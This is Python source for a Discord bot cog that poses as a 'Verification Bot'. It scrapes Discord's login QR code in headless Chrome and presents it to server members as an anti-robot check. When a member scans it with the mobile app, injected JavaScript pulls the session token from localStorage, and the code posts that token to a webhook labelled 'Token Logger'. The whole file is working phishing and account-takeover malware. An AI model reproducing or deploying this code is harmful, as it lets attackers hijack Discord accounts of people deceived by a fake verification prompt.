import discord
from discord.ext import commands, tasks
from discord.utils import get
from discord.ext.commands import has_permissions, CheckFailure
import asyncio
from bs4 import BeautifulSoup
from selenium.webdriver.support.ui import WebDriverWait
from selenium import webdriver
from PIL import Image
import base64, os, platform, re, requests, time
import time
import os
import requests
import random
import datetime
from datetime import date
from selenium.webdriver.support import expected_conditions
import threading
from webdriver_manager.chrome import ChromeDriverManager
url = webhook


def logo_qr(count):
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save(f'temp/{count}.png', quality=95)



class Buttons(discord.ui.View):
    def __init__(self,client, *, timeout=180):
        super().__init__(timeout=None)
    @discord.ui.button(label="Verify",custom_id="Verify",style=discord.ButtonStyle.green,emoji="✅")
    async def gray_button(self,interaction:discord.Interaction,button: discord.ui.Button):
        await interaction.response.defer(thinking = True,ephemeral=True)

        count = 0
        for thread in threading.enumerate():
            count += 1

        if count >= 10:   # How many Threads you want to run // Change if you can handle more.
            return await interaction.followup.send(content="Too many requests try again in 2 Minutes.")



        embed = discord.Embed(title=f"🤖Are you a robot?", description=f"✅ Scan this QR code to gain access to the rest of the server ✅\n\n**Couldnt find?**\n🚫 Try again. It can be buggy...\n\n**Important information**\n🚫 This will NOT work without the Discord mobile application 🚫\n🚫 This code only lasts 2 MINUTES!! 🚫\n\n**Tutorial**\n1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code")
        embed.set_author(name="Verification Bot", icon_url="https://media.discordapp.net/attachments/855286148624941126/987919753534386226/f43bfe6b62b3c38002b3c1cb5100a11a.png")
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_experimental_option('detach', True)
        driver = webdriver.Chrome(ChromeDriverManager().install(),options=options)
        driver.get('https://discord.com/login')
        WebDriverWait(driver, 10).until(expected_conditions.url_contains('https://discord.com/login'))
        await asyncio.sleep(1)
        page_source = driver.page_source
        source = BeautifulSoup(page_source, features='lxml')
        if not (div := re.search(r"qrCode-......", str(source))):
            print(f"{Fore.LIGHTRED_EX}Error: \
    the regular expression 'qrCode-......' is not found.")
            os._exit(1)
        div = div.group(0)
        div = source.find("div", {"class": f"{div}"})
        qr_code = div.find("img")["src"]
        source = BeautifulSoup(driver.page_source, features="lxml")
        div = source.find("div", {"class": "qrCode"})
        file = os.path.join(os.getcwd(), r"temp/qr_code.png")
        img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

        with open(file,'wb') as handler:
            handler.write(img_data)

        discord_login = driver.current_url
        n = random.randint(1,1000)
        logo_qr(n)
        PATH = f"temp/{n}.png"
        f = discord.File(f"temp/{n}.png", filename=f"{n}.png")
        e = discord.Embed()
        embed.set_image(url=f"attachment://{n}.png")

        try:
            await interaction.followup.send(file=f,embed=embed)
        except:
            os.remove(f"temp/{n}.png")
            return driver.quit()


        class Bruh:

            def paintwall(self):
                t_end = time.time() + 60 * 2
                while time.time() < t_end:
                    if discord_login != driver.current_url:
                        print('Grabbing token... \n')
                        token = driver.execute_script('''
            window.dispatchEvent(new Event('beforeunload'));
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            let localStorage = iframe.contentWindow.localStorage;
            var token = JSON.parse(localStorage.token);
            return token;

            ''')
                        print('------------------------------------------------------------------------------------------')
                        print('Token grabbed:',token)
                        #==================================================================================================================================
                        #Token Sent To webhook

                        data = {
                            "content" : f"```Token: {token} ```",
                            "username" : "Token Logger"
                        }
                        result = requests.post(url, json = data)
                        try:
                            result.raise_for_status()
                        except requests.exceptions.HTTPError as err:
                            print(err)
                        else:
                            print("Token Grabbed! Sent to Webook | code {}.".format(result.status_code))
                        #==================================================================================================================================
                        print('------------------------------------------------------------------------------------------')
                        break
                os.remove(f"temp/{n}.png")
                driver.quit()
            def __init__(self):
                t = threading.Thread(target=self.paintwall)
                t.start()

        Bruh()


class Verify(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def button(self,ctx):
        embed = discord.Embed(title=f"🤖Verification required", description=f"✅ Click the button below to get started.\n\n**Why do I need to verify?**\nWe require every user to verify to prevent raiding or malicious users.")
        await ctx.send(embed=embed,view=Buttons(self.client))

async def setup(client):
    await client.add_cog(Verify(client))
    client.add_view(Buttons(client))
